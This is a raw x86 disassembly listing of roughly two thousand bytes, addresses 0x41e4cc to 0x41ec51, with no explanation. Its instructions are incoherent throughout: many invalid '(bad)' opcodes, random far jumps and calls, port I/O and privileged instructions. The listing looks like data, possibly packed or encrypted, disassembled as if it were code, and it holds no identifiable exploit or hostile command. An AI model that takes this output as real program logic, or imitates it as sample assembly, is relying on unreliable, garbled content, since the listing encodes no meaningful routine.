  41e4cc:	sub    ebx,edx
  41e4ce:	mov    eax,ds:0xe7e82184
  41e4d3:	adc    BYTE PTR [edi-0x5e],dh
  41e4d6:	cmp    DWORD PTR [edx-0x6c52204d],esi
  41e4dc:	popa   
  41e4dd:	lahf   
  41e4de:	pop    esp
  41e4df:	daa    
  41e4e0:	jmp    0x41e50b
  41e4e2:	adc    BYTE PTR [ecx-0x66962204],dl
  41e4e8:	(bad)  
  41e4e9:	fistp  WORD PTR [edi-0x4f]
  41e4ec:	mov    BYTE PTR ds:0x1b044a96,0xfd
  41e4f3:	sub    al,0xae
  41e4f5:	outs   dx,BYTE PTR ds:[esi]
  41e4f6:	push   0x7d1425ca
  41e4fb:	iret   
  41e4fc:	jp     0x41e530
  41e4fe:	xchg   BYTE PTR [esi],dl
  41e500:	or     esi,DWORD PTR [ebp-0x53]
  41e503:	loop   0x41e4cf
  41e505:	sub    al,0xfd
  41e507:	dec    edx
  41e508:	int    0x4a
  41e50a:	pop    ss
  41e50b:	std    
  41e50c:	(bad)  
  41e50d:	js     0x41e53e
  41e50f:	enter  0xd144,0xbc
  41e513:	jo     0x41e497
  41e515:	les    esi,FWORD PTR [ecx+0x2d4a5b82]
  41e51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e51c:	jmp    0x41e4a4
  41e51e:	stos   DWORD PTR es:[edi],eax
  41e51f:	cmp    DWORD PTR [ecx],0xffffff83
  41e522:	push   ss
  41e523:	cmp    cl,BYTE PTR [ebx-0x5b4600cb]
  41e529:	int    0x53
  41e52b:	enter  0xcf20,0x91
  41e52f:	lods   eax,DWORD PTR ds:[esi]
  41e530:	jae    0x41e521
  41e532:	cld    
  41e533:	fcom   st(2)
  41e535:	sub    BYTE PTR [ecx-0x1],0x3
  41e539:	xor    eax,0xc62fc7f0
  41e53e:	mov    al,ds:0x5c27d74d
  41e543:	xor    ebx,ebp
  41e545:	repz sub al,0xea
  41e548:	push   ebp
  41e549:	xor    BYTE PTR [edi],0x58
  41e54c:	mov    ebx,0x4bc7e3c9
  41e551:	xlat   BYTE PTR ds:[ebx]
  41e552:	xchg   BYTE PTR [edx-0x5ecde04a],ch
  41e558:	adc    DWORD PTR ds:0x2fd17bfe,esp
  41e55e:	scas   al,BYTE PTR es:[edi]
  41e55f:	dec    esp
  41e560:	ds xchg edi,eax
  41e562:	fsub   QWORD PTR [ecx+0x27]
  41e565:	retf   0xc83e
  41e568:	adc    esp,0xffffffeb
  41e56b:	jmp    FWORD PTR [eax+eiz*4]
  41e56e:	xchg   edi,eax
  41e570:	jmp    0x41e4ff
  41e572:	fstp   TBYTE PTR [ebx]
  41e574:	call   0xb4dc:0xa72ed548
  41e57b:	xchg   edi,eax
  41e57c:	mov    WORD PTR [eax+0x17],gs
  41e57f:	inc    esp
  41e580:	sub    eax,DWORD PTR [edx]
  41e582:	pop    ecx
  41e583:	jne    0x41e570
  41e585:	test   al,0x30
  41e587:	xchg   ebx,eax
  41e588:	xor    eax,0x36d58941
  41e58d:	frstor [ebx-0x6f2e3b89]
  41e593:	pop    esp
  41e594:	or     al,0xeb
  41e596:	fisub  WORD PTR [edi-0x1a028ea8]
  41e59c:	mov    ah,BYTE PTR [edi+edx*1-0x4a76ab3c]
  41e5a3:	xchg   ebp,eax
  41e5a4:	es loopne 0x41e550
  41e5a7:	mov    al,BYTE PTR [eax-0x5237f0d7]
  41e5ad:	sub    eax,0x2f769ce5
  41e5b2:	push   ebp
  41e5b3:	push   ss
  41e5b4:	fbstp  TBYTE PTR gs:0x9f9f79cc
  41e5bb:	nop
  41e5bc:	jae    0x41e53f
  41e5be:	xor    eax,0xfcd02753
  41e5c3:	pop    es
  41e5c4:	sub    eax,0xf0ef7afd
  41e5c9:	(bad)  
  41e5cb:	(bad)  
  41e5cc:	sbb    eax,0xb2236790
  41e5d1:	pop    ebx
  41e5d2:	dec    ecx
  41e5d3:	and    ecx,esp
  41e5d5:	cmp    eax,0x207d4af1
  41e5da:	sub    ch,dl
  41e5dc:	push   ds
  41e5dd:	daa    
  41e5de:	sub    edi,DWORD PTR [edi+0x223cde8f]
  41e5e4:	inc    esp
  41e5e5:	push   esp
  41e5e6:	cmp    DWORD PTR [ecx+ecx*4],esp
  41e5e9:	and    edx,DWORD PTR [eax+0x2780eba8]
  41e5ef:	add    al,0x3f
  41e5f1:	fstp   st(7)
  41e5f3:	inc    edx
  41e5f4:	jns    0x41e5d5
  41e5f6:	xchg   ebx,eax
  41e5f7:	sbb    al,0xc6
  41e5f9:	jge    0x41e59a
  41e5fb:	jb     0x41e66c
  41e5fd:	lods   eax,DWORD PTR ds:[esi]
  41e5fe:	fs out 0xee,al
  41e601:	shl    DWORD PTR [ecx+esi*8],cl
  41e604:	loopne 0x41e60f
  41e606:	std    
  41e607:	xor    dh,dl
  41e609:	jmp    0x41e651
  41e60b:	push   edx
  41e60c:	push   cs
  41e60d:	or     BYTE PTR ds:0x2313eb05,ch
  41e613:	add    DWORD PTR [edi-0x151c5393],ecx
  41e619:	push   edi
  41e61a:	mov    esp,0xde582bb2
  41e61f:	push   edi
  41e620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e621:	or     ecx,DWORD PTR [eax+ebx*1-0x61d737a4]
  41e628:	call   esi
  41e62a:	lock mov al,ds:0xb1f40dee
  41e630:	stos   DWORD PTR es:[edi],eax
  41e631:	call   0xc0210df5
  41e636:	cld    
  41e637:	dec    ebp
  41e638:	mov    ch,0x57
  41e63a:	test   bl,bh
  41e63c:	pop    esi
  41e63d:	sub    ebp,DWORD PTR [esi+ecx*8-0x7c89d9d4]
  41e644:	and    BYTE PTR [edi+eax*1+0xce56b45],dl
  41e64b:	mov    al,BYTE PTR [esi-0x5d0c0293]
  41e651:	outs   dx,DWORD PTR ds:[esi]
  41e652:	jne    0x41e63d
  41e654:	ficomp WORD PTR [edi+0x2aeac8c2]
  41e65a:	and    DWORD PTR [ebx-0x1571c5aa],esi
  41e660:	loopne 0x41e629
  41e662:	out    dx,al
  41e663:	retf   0x8612
  41e666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e667:	adc    BYTE PTR [ebx],al
  41e669:	cmp    BYTE PTR [edx+ecx*4-0x44b121bb],bl
  41e670:	fcomp  QWORD PTR [ecx+0x27988fcc]
  41e676:	stc    
  41e677:	test   ebx,ebp
  41e679:	stos   DWORD PTR es:[edi],eax
  41e67a:	popf   
  41e67b:	mov    ah,0x41
  41e67d:	or     DWORD PTR [esi],edi
  41e67f:	xchg   DWORD PTR [edi+ebx*8],esi
  41e682:	jg     0x41e6a1
  41e684:	out    dx,eax
  41e685:	xor    esi,ebx
  41e687:	bnd jmp 0xd697e869
  41e68d:	sbb    edi,DWORD PTR [ebp+0x2b]
  41e690:	mov    bl,BYTE PTR [esp+eax*2-0x7a318409]
  41e697:	enter  0xbf61,0x91
  41e69b:	outs   dx,BYTE PTR ds:[esi]
  41e69c:	adc    DWORD PTR [ecx],ebx
  41e69e:	cmp    BYTE PTR [ebp-0x7203399d],dl
  41e6a4:	cdq    
  41e6a5:	cld    
  41e6a6:	inc    DWORD PTR [ebp+eax*2+0x55cf00c6]
  41e6ad:	dec    edx
  41e6ae:	aaa    
  41e6af:	xchg   esp,eax
  41e6b0:	mov    ebp,DWORD PTR [ecx]
  41e6b2:	jno    0x41e6d3
  41e6b4:	(bad)  
  41e6b5:	mov    edx,0xe2ebb420
  41e6ba:	mov    al,ds:0xa503220a
  41e6bf:	jno    0x41e68b
  41e6c1:	fnstsw ax
  41e6c3:	lock jo 0x41e697
  41e6c6:	xchg   bh,al
  41e6c8:	repnz dec edi
  41e6ca:	(bad)  
  41e6cb:	jl     0x41e6b4
  41e6cd:	sub    ch,al
  41e6cf:	add    al,BYTE PTR [edx+0x46b59956]
  41e6d5:	fistp  WORD PTR [edx+0xc70e3da]
  41e6db:	int    0x3
  41e6dd:	shr    ah,0x71
  41e6e0:	ja     0x41e69f
  41e6e2:	fimul  DWORD PTR [ebx+esi*2]
  41e6e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e6:	sbb    eax,0xb027ea5d
  41e6eb:	pop    ss
  41e6ec:	pop    ecx
  41e6ed:	mov    WORD PTR [ebp-0x16],ss
  41e6f0:	xchg   DWORD PTR [esi+0x5d3b9d00],eax
  41e6f6:	cli    
  41e6f7:	push   edx
  41e6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6f9:	outs   dx,DWORD PTR ds:[esi]
  41e6fa:	and    DWORD PTR [edi],esi
  41e6fc:	sar    DWORD PTR [edx],0xb5
  41e6ff:	push   edi
  41e700:	in     eax,dx
  41e701:	fnstsw WORD PTR [eax+0x3f]
  41e704:	rcr    dl,0xf0
  41e707:	sub    DWORD PTR [ebx-0x14be21fb],ebp
  41e70d:	push   gs
  41e70f:	push   ebx
  41e710:	adc    al,0x42
  41e712:	pop    ebp
  41e713:	cld    
  41e714:	jg     0x41e6f4
  41e716:	lahf   
  41e717:	xchg   ebp,eax
  41e718:	aad    0xda
  41e71a:	jg     0x41e72b
  41e71c:	sub    ah,BYTE PTR [ebx]
  41e71e:	cmp    al,0x9f
  41e720:	dec    ebx
  41e721:	jns    0x41e71a
  41e723:	shr    bl,cl
  41e725:	add    esi,DWORD PTR [edx-0x35389c15]
  41e72b:	in     eax,0x7e
  41e72d:	fistp  QWORD PTR [edx+0x1f]
  41e730:	rol    BYTE PTR [eax-0x52],cl
  41e733:	sub    bh,cl
  41e735:	mov    edi,edi
  41e737:	or     eax,0x6950060e
  41e73c:	idiv   DWORD PTR [edi]
  41e73e:	jmp    0xd008:0xe3d8dcc2
  41e745:	mov    ecx,0xe0d9c8a3
  41e74a:	loopne 0x41e6d4
  41e74c:	std    
  41e74d:	outs   dx,DWORD PTR ds:[esi]
  41e74e:	cld    
  41e74f:	clc    
  41e750:	cmp    DWORD PTR [ecx],ebp
  41e752:	inc    eax
  41e753:	jns    0x41e78f
  41e755:	ins    BYTE PTR es:[edi],dx
  41e756:	ror    DWORD PTR [edi+0xa],cl
  41e759:	out    0x95,eax
  41e75b:	jecxz  0x41e789
  41e75d:	cmp    eax,0x1d1c617d
  41e762:	repz add eax,0xd5fd7a06
  41e768:	(bad)  
  41e76a:	or     DWORD PTR [ebx+0x4],ecx
  41e76d:	jmp    0xc1e4:0xbae8c823
  41e774:	adc    eax,0x1b1a1663
  41e779:	xchg   esi,eax
  41e77a:	std    
  41e77b:	popa   
  41e77c:	dec    ecx
  41e77d:	jbe    0x41e7ce
  41e77f:	adc    ecx,DWORD PTR [esi+0x32]
  41e782:	fisub  WORD PTR [esi]
  41e784:	mov    ebp,DWORD PTR [ecx]
  41e786:	or     al,0xe0
  41e789:	and    eax,0x51d69020
  41e78e:	xor    al,0xb4
  41e790:	out    0xfc,eax
  41e792:	cmp    dl,BYTE PTR ss:[edi+0x7808579a]
  41e799:	sub    cl,BYTE PTR [eax+0x757beb19]
  41e79f:	sub    edi,DWORD PTR [ebp-0x24]
  41e7a2:	aad    0x6d
  41e7a4:	pusha  
  41e7a5:	fild   WORD PTR [ebp*1-0x942cc58]
  41e7ac:	popa   
  41e7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ae:	cld    
  41e7af:	mov    edx,0xcfe42a9
  41e7b4:	mov    dh,0x12
  41e7b6:	mov    ah,0xc8
  41e7b8:	and    esp,DWORD PTR [edi]
  41e7ba:	jle    0x41e755
  41e7bc:	mov    DWORD PTR [ebx+0x34],ecx
  41e7bf:	inc    esp
  41e7c0:	in     al,dx
  41e7c1:	mov    bh,0x11
  41e7c3:	dec    ebp
  41e7c4:	jnp    0x41e78f
  41e7c6:	push   esi
  41e7c7:	mov    ecx,0xe0dafe2f
  41e7cc:	cli    
  41e7cd:	call   0x4c73734e
  41e7d2:	xor    al,0x5a
  41e7d4:	not    BYTE PTR [eax-0xc]
  41e7d7:	xchg   edx,eax
  41e7d8:	mov    al,ds:0x5bc8cc5f
  41e7dd:	xor    eax,0xdf205259
  41e7e2:	adc    bh,bh
  41e7e4:	arpl   WORD PTR [esi+eax*2-0x74],bp
  41e7e8:	xchg   esi,eax
  41e7e9:	jl     0x41e7e8
  41e7eb:	or     al,0x90
  41e7ed:	inc    eax
  41e7ee:	call   0xd1c8:0x6d85581f
  41e7f5:	retf   
  41e7f6:	add    al,0x3b
  41e7f8:	xlat   BYTE PTR ds:[ebx]
  41e7f9:	push   ecx
  41e7fa:	xchg   ebp,eax
  41e7fb:	sub    bl,ch
  41e7fd:	or     bh,BYTE PTR [ebx-0x4b]
  41e800:	cmp    DWORD PTR [edx+0x5d],ebp
  41e803:	pop    esi
  41e804:	(bad)  
  41e806:	xlat   BYTE PTR ds:[ebx]
  41e807:	icebp  
  41e808:	jle    0x41e7b5
  41e80a:	js     0x41e865
  41e80c:	bound  ebx,QWORD PTR [edx+0x27]
  41e80f:	cmp    esp,ebp
  41e811:	daa    
  41e812:	mov    BYTE PTR [edi],cl
  41e814:	mov    eax,ds:0x7c6c966
  41e819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81a:	cmp    eax,0xfc948ede
  41e81f:	shl    bl,0xb2
  41e822:	lock out 0x2b,al
  41e825:	(bad)  
  41e828:	ins    BYTE PTR es:[edi],dx
  41e829:	and    al,0x36
  41e82b:	rcr    DWORD PTR [eax],1
  41e82d:	rcr    DWORD PTR [ebp+0x39067ac8],1
  41e833:	and    BYTE PTR [edi-0x14c22e07],ch
  41e839:	jb     0x41e837
  41e83b:	stos   BYTE PTR es:[edi],al
  41e83c:	push   ss
  41e83d:	rol    BYTE PTR [eax+0x79],0xdb
  41e841:	fistp  WORD PTR [edx-0x6ed5eb86]
  41e847:	sub    eax,0x84fccb53
  41e84c:	mov    eax,ds:0x5f41db67
  41e851:	and    DWORD PTR [edi+eax*8-0x314e7e53],0x42
  41e859:	(bad)  
  41e85a:	scas   eax,DWORD PTR es:[edi]
  41e85b:	outs   dx,BYTE PTR ds:[esi]
  41e85c:	retf   0xfcf2
  41e85f:	pushf  
  41e860:	rcr    BYTE PTR [eax-0x6b3a0086],0x12
  41e867:	enter  0xe38,0x6c
  41e86b:	pop    esp
  41e86c:	mov    edi,0xebc035d2
  41e871:	pop    esi
  41e872:	mov    esp,0x331d351c
  41e877:	mov    bh,BYTE PTR [esi]
  41e879:	fcomp  QWORD PTR [ebx+0x500a422d]
  41e87f:	push   ds
  41e880:	push   ebx
  41e881:	sbb    DWORD PTR [ebp-0x100e145d],0x955534e7
  41e88b:	popf   
  41e88c:	xchg   dh,bl
  41e88e:	fdiv   DWORD PTR [eax+0xc1e3c6d]
  41e894:	pop    eax
  41e895:	inc    edi
  41e896:	xor    al,0xf3
  41e898:	ret    
  41e899:	xchg   ebx,eax
  41e89a:	xchg   esp,eax
  41e89b:	iret   
  41e89c:	jl     0x41e8b0
  41e89e:	sub    ch,BYTE PTR [eax]
  41e8a0:	or     al,0xd
  41e8a2:	and    BYTE PTR [ecx+edi*2],al
  41e8a5:	icebp  
  41e8a6:	sub    sp,WORD PTR [edi+ebx*8]
  41e8aa:	cdq    
  41e8ab:	jle    0x41e832
  41e8ad:	or     esi,esp
  41e8af:	jns    0x41e89c
  41e8b1:	ftst   
  41e8b3:	call   0xdc7f:0x6efa2e9
  41e8ba:	xchg   esi,eax
  41e8bb:	mov    ch,0xc1
  41e8bd:	fwait
  41e8be:	mov    BYTE PTR [esi+0x7917184b],cl
  41e8c4:	jmp    0x41e8ef
  41e8c6:	push   ecx
  41e8c7:	jbe    0x41e92e
  41e8c9:	add    DWORD PTR [ecx],edx
  41e8cb:	xchg   BYTE PTR [edx-0x30b66f21],al
  41e8d1:	dec    esi
  41e8d2:	add    eax,esi
  41e8d4:	lods   eax,DWORD PTR ds:[esi]
  41e8d5:	jmp    0xaba2:0xc976fbfc
  41e8dc:	xchg   BYTE PTR [edi],ah
  41e8de:	es adc al,0xea
  41e8e1:	ffreep st(7)
  41e8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e4:	xor    bh,BYTE PTR [esi-0x788a98ca]
  41e8ea:	std    
  41e8eb:	(bad)  
  41e8ec:	loope  0x41e8d8
  41e8ee:	dec    esi
  41e8ef:	retfw  
  41e8f1:	jne    0x41e943
  41e8f3:	les    ebx,FWORD PTR [edx+0x45]
  41e8f6:	iret   
  41e8f7:	jno    0x41e96a
  41e8f9:	pop    edi
  41e8fa:	test   al,0xda
  41e8fc:	add    DWORD PTR [ecx+0x1],edx
  41e8ff:	adc    eax,0xa2fce938
  41e904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e905:	push   edi
  41e906:	cmp    BYTE PTR [edi],cl
  41e908:	dec    edx
  41e909:	fdivr  DWORD PTR [ebp+0x5bca31c1]
  41e90f:	fwait
  41e910:	mov    di,0x2744
  41e914:	lahf   
  41e915:	rol    DWORD PTR [eax],1
  41e917:	lea    ebp,[esi-0x2febc2e6]
  41e91d:	ss iret 
  41e91f:	fld    QWORD PTR [edx-0x1462eb55]
  41e925:	test   BYTE PTR [ebx+0x559f16f7],bl
  41e92b:	in     al,dx
  41e92c:	jmp    0x41e8e9
  41e92e:	aad    0x4a
  41e930:	in     eax,0xc0
  41e932:	lahf   
  41e933:	push   edx
  41e934:	dec    esp
  41e935:	jmp    0xc8c0:0x7804ce2d
  41e93c:	sbb    eax,0x8d43d721
  41e941:	pop    esp
  41e942:	xchg   ebx,eax
  41e943:	add    ebp,ebx
  41e945:	mov    bh,BYTE PTR [ebx]
  41e947:	cmp    al,0x19
  41e949:	sar    DWORD PTR es:[ebp+0x6b],0xdf
  41e94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e94f:	mov    al,ds:0x71ad04d7
  41e954:	mov    al,ds:0x158eab36
  41e959:	icebp  
  41e95a:	cld    
  41e95b:	xor    DWORD PTR ds:0xcc606098,ecx
  41e961:	lock cwde 
  41e963:	enter  0xd070,0x5c
  41e967:	icebp  
  41e968:	icebp  
  41e969:	ins    DWORD PTR es:[edi],dx
  41e96a:	sti    
  41e96b:	xchg   ebp,eax
  41e96c:	jmp    0x41e98e
  41e96e:	bound  esp,QWORD PTR [ecx-0x14]
  41e971:	repnz data16 add al,dh
  41e975:	ficomp WORD PTR [eax-0x73c48b97]
  41e97b:	ins    BYTE PTR es:[edi],dx
  41e97c:	fst    QWORD PTR [edi]
  41e97e:	mov    esp,0x3ce6eb97
  41e983:	iret   
  41e984:	or     BYTE PTR [eax+0x60],ch
  41e987:	or     ebx,DWORD PTR [ecx]
  41e989:	(bad)  
  41e98a:	in     eax,0x8e
  41e98c:	pop    ss
  41e98d:	xor    eax,DWORD PTR [ebx-0x27]
  41e990:	out    0x21,al
  41e992:	sbb    al,0x67
  41e994:	cmp    ebx,DWORD PTR [edi]
  41e996:	add    eax,0x9adf843a
  41e99b:	test   al,0xa8
  41e99d:	xlat   BYTE PTR ds:[ebx]
  41e99e:	std    
  41e99f:	stos   BYTE PTR es:[edi],al
  41e9a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9a1:	std    
  41e9a2:	push   cs
  41e9a3:	scas   al,BYTE PTR es:[edi]
  41e9a4:	jae    0x41e9c3
  41e9a6:	std    
  41e9a7:	mov    al,ds:0xe89c78de
  41e9ac:	fistp  WORD PTR [si+0x7]
  41e9b0:	xchg   ebx,eax
  41e9b1:	mov    ebp,0xe1d1d254
  41e9b6:	repnz cmp eax,0x28930b01
  41e9bc:	cld    
  41e9bd:	fidivr WORD PTR [ebp+0x72]
  41e9c0:	pop    es
  41e9c1:	fild   QWORD PTR [ebp-0x3]
  41e9c4:	sbb    DWORD PTR [ecx-0x4592c408],esi
  41e9ca:	bnd jns 0x41e958
  41e9cd:	sar    DWORD PTR [eax],1
  41e9cf:	sub    BYTE PTR [esi-0x1b],dh
  41e9d2:	push   eax
  41e9d3:	mov    al,BYTE PTR [eax]
  41e9d5:	loopne 0x41e9db
  41e9d7:	push   edx
  41e9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d9:	push   ss
  41e9da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9db:	nop
  41e9dc:	nop
  41e9dd:	pop    ss
  41e9de:	std    
  41e9df:	pop    esi
  41e9e0:	pop    ebp
  41e9e1:	sbb    dl,BYTE PTR ds:0x4ec19dde
  41e9e7:	enter  0x13c,0xeb
  41e9eb:	daa    
  41e9ec:	lea    edx,[edx-0x7a118ed9]
  41e9f2:	push   cs
  41e9f3:	add    al,BYTE PTR [ecx+0x49abddbf]
  41e9f9:	mov    DWORD PTR [eax+ecx*8+0x15],edi
  41e9fd:	shl    esi,cl
  41e9ff:	dec    ebp
  41ea00:	push   0xeb62f2a2
  41ea05:	call   0x2491:0xdc1640dc
  41ea0c:	std    
  41ea0d:	(bad)  
  41ea0f:	fld    TBYTE PTR [edx-0x43]
  41ea12:	mov    cl,0x3
  41ea14:	popa   
  41ea15:	and    ebp,edi
  41ea17:	rcr    DWORD PTR [eax],1
  41ea19:	shl    WORD PTR [ebx-0xc],1
  41ea1d:	cmovl  ecx,eax
  41ea20:	mov    cl,bl
  41ea22:	mov    edi,0x6a50f8f7
  41ea27:	lahf   
  41ea28:	jmp    0x41ea77
  41ea2a:	jb     0x41e9f8
  41ea2c:	pop    ds
  41ea2d:	or     bl,BYTE PTR [ebx]
  41ea2f:	xor    ah,BYTE PTR [eax-0x3a7c1921]
  41ea35:	mov    ecx,0x95aa7297
  41ea3a:	cld    
  41ea3b:	stc    
  41ea3c:	pop    esi
  41ea3d:	jnp    0x41ea1e
  41ea3f:	and    BYTE PTR ds:[ebx],0xc0
  41ea43:	enter  0xec6d,0x55
  41ea47:	call   0x13fe:0xad4d6778
  41ea4e:	scas   eax,DWORD PTR es:[edi]
  41ea4f:	sub    ax,cx
  41ea52:	je     0x41ea91
  41ea54:	push   ds
  41ea55:	sub    esp,DWORD PTR [ecx]
  41ea57:	sbb    al,0x46
  41ea59:	fldpi  
  41ea5b:	(bad)
  41ea5e:	cld    
  41ea5f:	std    
  41ea60:	pop    ecx
  41ea61:	lods   al,BYTE PTR ds:[esi]
  41ea62:	aaa    
  41ea63:	mov    esp,0xcf565ceb
  41ea68:	iret   
  41ea69:	ret    
  41ea6a:	pop    ecx
  41ea6b:	jl     0x41ea4b
  41ea6d:	fidiv  WORD PTR [esi]
  41ea6f:	scas   eax,DWORD PTR es:[edi]
  41ea70:	mov    ebx,DWORD PTR [edx+eax*1-0x7c888fc]
  41ea77:	and    ch,bl
  41ea79:	xchg   DWORD PTR [ebx-0x275c33f0],edi
  41ea7f:	jno    0x41ea15
  41ea81:	fist   WORD PTR [ebx]
  41ea83:	test   BYTE PTR [ebp+0x60],0xe5
  41ea87:	add    DWORD PTR [edx-0x657e02a3],esp
  41ea8d:	test   BYTE PTR [eax+ebx*8-0x38054a87],0x63
  41ea95:	(bad)  
  41ea99:	leave  
  41ea9a:	loopne 0x41eaa6
  41ea9c:	jmp    0x41ea4a
  41ea9e:	push   cs
  41ea9f:	jl     0x41eac0
  41eaa1:	add    eax,0xdf6e5297
  41eaa6:	sub    bl,dh
  41eaa8:	dec    eax
  41eaa9:	hlt    
  41eaaa:	test   eax,0x44c47529
  41eaaf:	or     BYTE PTR [edx+0x619eb7df],cl
  41eab5:	pusha  
  41eab6:	sbb    dh,dl
  41eab8:	jg     0x41eaa2
  41eaba:	enter  0x57b1,0xe0
  41eabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eabf:	(bad)  
  41eac0:	out    0xae,al
  41eac2:	pop    es
  41eac3:	push   eax
  41eac4:	fwait
  41eac5:	iret   
  41eac6:	sar    BYTE PTR [edx-0x15],1
  41eac9:	mov    ch,0xe3
  41eacb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eacc:	pop    ebp
  41eacd:	inc    esp
  41eace:	pop    esi
  41eacf:	jl     0x41eab8
  41ead1:	(bad)  
  41ead3:	enter  0x3b7,0x99
  41ead7:	das    
  41ead8:	mov    BYTE PTR [edx-0x59],bh
  41eadb:	jge    0x41eac8
  41eadd:	and    edi,DWORD PTR [edi+0x24088f94]
  41eae3:	mov    al,ds:0x2a9fede0
  41eae8:	imul   esi,DWORD PTR [edi],0xffffffbc
  41eaeb:	enter  0xd450,0x91
  41eaef:	fcomp  DWORD PTR [edi+0x7dc8a1ab]
  41eaf5:	mov    al,ds:0xecd5880e
  41eafa:	or     ebp,DWORD PTR [ecx]
  41eafc:	jmp    0x41ea8f
  41eafe:	lea    ebp,[ecx+edi*1]
  41eb01:	jne    0x41eac7
  41eb03:	test   eax,0x3b63df8f
  41eb08:	mov    dh,0xda
  41eb0a:	inc    ebp
  41eb0b:	sbb    BYTE PTR [edi-0x219602f0],ch
  41eb11:	jmp    0xcae8:0xe3794826
  41eb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb19:	rcl    DWORD PTR [ebp-0x11],cl
  41eb1c:	mov    ebx,0x25b9a499
  41eb21:	inc    ebx
  41eb22:	std    
  41eb23:	xchg   ebp,eax
  41eb24:	xor    cl,ch
  41eb26:	mov    edx,DWORD PTR ds:0xc7f78d98
  41eb2c:	shl    BYTE PTR [edi-0xe8d9ccf],cl
  41eb32:	shl    BYTE PTR [esi-0x1a],cl
  41eb35:	mov    WORD PTR [edx-0x30d7a67],es
  41eb3b:	or     eax,DWORD PTR [edi]
  41eb3d:	lods   al,BYTE PTR ds:[esi]
  41eb3e:	cmp    eax,ecx
  41eb40:	retf   0x267e
  41eb43:	xor    eax,0x50b3a665
  41eb48:	jmp    0x41eb2f
  41eb4a:	sub    eax,0x2fb23cc9
  41eb4f:	lods   al,BYTE PTR ds:[esi]
  41eb50:	ret    
  41eb51:	call   0xde681cc8
  41eb56:	push   eax
  41eb57:	test   al,0xa1
  41eb59:	fidiv  DWORD PTR [edi]
  41eb5b:	adc    al,0xb
  41eb5d:	push   0xfffffffd
  41eb5f:	int    0x12
  41eb61:	leave  
  41eb62:	and    eax,0x7aad491e
  41eb67:	enter  0x70bd,0xf9
  41eb6b:	sbb    ebx,DWORD PTR [edx+ebx*4+0x1d]
  41eb6f:	inc    ecx
  41eb70:	jmp    0x41eb6f
  41eb72:	(bad)
  41eb75:	cmp    eax,0xdeaf8a12
  41eb7a:	leave  
  41eb7b:	repnz and DWORD PTR [esi],edx
  41eb7e:	sub    ecx,ebp
  41eb80:	push   esi
  41eb81:	lahf   
  41eb82:	add    al,0x4b
  41eb85:	jbe    0x41eb84
  41eb87:	xor    eax,0x5eae945f
  41eb8c:	push   es
  41eb8d:	lock out dx,eax
  41eb8f:	leave  
  41eb90:	mov    eax,0xe276118c
  41eb95:	fnstsw WORD PTR [esi+eiz*8+0x582b16e0]
  41eb9c:	jmp    0xf35603f3
  41eba1:	stc    
  41eba2:	add    BYTE PTR [eax],ch
  41eba4:	loopne 0x41eb37
  41eba6:	jnp    0x41eb70
  41eba8:	das    
  41eba9:	mov    bl,0x5
  41ebab:	dec    edx
  41ebac:	or     eax,0xeb76d454
  41ebb1:	add    ecx,esi
  41ebb3:	ins    BYTE PTR es:[edi],dx
  41ebb4:	xchg   edi,eax
  41ebb5:	sub    eax,0xd66213a2
  41ebba:	loope  0x41eb4a
  41ebbc:	sbb    DWORD PTR [esp+edi*8-0x35b3b458],0xffffff84
  41ebc4:	jmp    0x41ebfe
  41ebc6:	sub    eax,0xd9fa5bb1
  41ebcb:	pop    edi
  41ebcc:	clc    
  41ebcd:	iret   
  41ebce:	faddp  st(7),st
  41ebd0:	xor    DWORD PTR gs:[edi-0x1e146d7f],eax
  41ebd7:	pop    ecx
  41ebd8:	std    
  41ebd9:	jnp    0x41ec3d
  41ebdb:	js     0x41eb88
  41ebdd:	(bad)  
  41ebe0:	mov    bl,BYTE PTR [edx-0xe5937c1]
  41ebe6:	data16 in al,dx
  41ebe8:	test   DWORD PTR [edi],ecx
  41ebea:	out    dx,al
  41ebeb:	sbb    dh,dl
  41ebed:	(bad)  
  41ebee:	rcl    BYTE PTR [esi-0x29],0xdf
  41ebf2:	inc    esi
  41ebf3:	inc    ecx
  41ebf4:	icebp  
  41ebf5:	sub    BYTE PTR [esi],al
  41ebf7:	rcl    DWORD PTR ds:0x69073c3d,cl
  41ebfd:	mov    cl,0x65
  41ebff:	jmp    0x41ec2c
  41ec01:	cmp    DWORD PTR [edx-0x140814cc],esp
  41ec07:	call   0x27130b82
  41ec0c:	fucomi st,st(1)
  41ec0e:	xchg   ebx,eax
  41ec0f:	bound  esp,QWORD PTR [edi-0x20]
  41ec12:	jp     0x41ec65
  41ec14:	pop    esp
  41ec15:	setbe  BYTE PTR [ebx-0xf03ef52]
  41ec1c:	enter  0x73f5,0xd5
  41ec20:	mov    edi,DWORD PTR [esp+edx*4]
  41ec23:	pop    ss
  41ec24:	pop    edx
  41ec25:	cmp    DWORD PTR [ebx+0x2168c0c8],eax
  41ec2b:	or     esp,eax
  41ec2d:	loope  0x41ec7c
  41ec2f:	add    ebx,ebp
  41ec31:	mov    BYTE PTR [esi+0x3b5e5815],al
  41ec37:	sbb    ebp,DWORD PTR [esi-0x21]
  41ec3a:	pop    es
  41ec3b:	mov    ah,0xe2
  41ec3d:	add    cl,dh
  41ec3f:	cmp    eax,DWORD PTR [edx-0x281c0314]
  41ec45:	inc    ebx
  41ec46:	popa   
  41ec47:	ins    BYTE PTR es:[edi],dx
  41ec48:	push   ebp
  41ec49:	(bad)  
  41ec4a:	out    dx,eax
  41ec4b:	mov    ecx,DWORD PTR [ebp+0x22]
  41ec4e:	std    
  41ec4f:	mov    dl,0xf
  41ec51:	jne    0x41ec12
